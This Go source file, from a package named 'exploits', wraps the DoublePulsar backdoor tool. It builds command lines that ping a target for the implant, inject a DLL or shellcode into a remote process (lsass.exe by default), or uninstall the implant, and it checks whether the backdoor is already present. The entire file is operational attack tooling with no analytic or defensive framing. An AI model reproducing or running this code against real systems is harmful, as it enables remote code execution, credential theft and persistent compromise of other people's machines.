package exploits

import (
	"bufio"
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
	"strings"
)

func Doublepulsar() {
	var cmd *exec.Cmd
	metatdatas.MetaData.SetFunction()
	switch metatdatas.MetaData.Function {
	case "Ping":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
		fmt.Println(cmd)
	case "RunDLL":
		metatdatas.MetaData.SetDLLPath()
		ProcessName := SetProcessName()
		metatdatas.MetaData.SetArch()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--Architecture", metatdatas.MetaData.Arch, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--DllPayload", metatdatas.MetaData.DLLPath, "--ProcessName", ProcessName)
	case "RunShellcode":
		metatdatas.MetaData.SetDLLPath()
		ProcessName := SetProcessName()
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function, "--ShellcodeFile", metatdatas.MetaData.DLLPath, "--ShellcodeData", metatdatas.MetaData.ShellcodeBuffer, "--ProcessName", ProcessName)
	case "Uninstall":
		cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	}
	metatdatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
func SetProcessName() string {
	ProcessName := ""
	fmt.Print(utils.ColorPrint(1, "Set ProcessName(default is lsass.exe):"))
	fmt.Scanf("%s", &ProcessName)
	if ProcessName == "" {
		ProcessName = "lsass.exe"
	}
	fmt.Println(utils.ColorPrint(0, "[+] Set ProcessName ==> "+ProcessName))
	return ProcessName
}
func BackDoorCheck() bool {
	fmt.Println(utils.ColorPrint(0, "Checking Backdoor........"))
	cmd := exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", metatdatas.MetaData.Target, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Function", metatdatas.MetaData.Function)
	results := ""
	stdout, err := cmd.StdoutPipe()
	defer stdout.Close()
	if err != nil {
		fmt.Println("err:" + err.Error())
	}
	stderr, err := cmd.StderrPipe()
	defer stderr.Close()
	if err != nil {
		fmt.Println("err:" + err.Error())
	}
	err = cmd.Start()
	if err != nil {
		fmt.Println("err:" + err.Error())
	}
	outScanner := bufio.NewScanner(stdout)
	go func() {
		for outScanner.Scan() {
			results = results + outScanner.Text()
		}
	}()
	err = cmd.Wait()
	if strings.Contains(results, "Backdoor installed") {
		fmt.Println(utils.ColorPrint(0, "Already Have Backdoor,Just Inject ShellCode With DoublePulsar."))
		return true
	}
	fmt.Println(utils.ColorPrint(-1, "Backdoor Not Present."))
	return false
}
